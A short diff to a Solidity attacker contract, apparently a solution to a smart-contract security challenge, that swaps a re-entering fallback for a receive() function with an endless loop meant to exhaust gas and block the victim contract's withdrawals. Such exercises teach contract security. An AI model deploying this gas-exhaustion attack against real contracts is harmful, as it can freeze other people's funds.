@@ -11,9 +11,10 @@ contract AttackingDenial {
     }
 
     //Code me!
-    fallback() external payable {
-        if (d.contractBalance() > 0) {
-            d.withdraw();
+    receive() external payable {
+       uint256 counter =0;
+        while (true) {
+            counter++;
 
         }
     }
